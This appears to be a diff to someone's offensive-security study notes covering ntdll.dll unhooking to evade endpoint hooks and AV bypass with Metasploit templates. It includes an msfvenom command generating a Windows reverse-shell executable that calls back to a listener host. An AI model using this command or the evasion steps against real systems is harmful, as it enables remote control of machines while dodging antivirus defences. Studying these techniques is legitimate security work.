@@ -40,3 +40,16 @@ Get original memory protections of the hooked module's .text section
 Copy .text section from the freshly mapped dll to the virtual address (found in step 3) of the original (hooked) ntdll.dll - this is the meat of the unhooking as all hooked bytes get overwritten with fresh ones from the disk
 Apply original memory protections to the freshly unhooked .text section of the original ntdll.dll
 
+I dont know what to do with ntdll
+cant understand the code
+
+# AV Bypass with Metsploit Templates and Custom Binaries
+
+https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates
+
+generating a reverse shell payload
+1. msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
+
+initial detection 51
+
+install metatwin and check
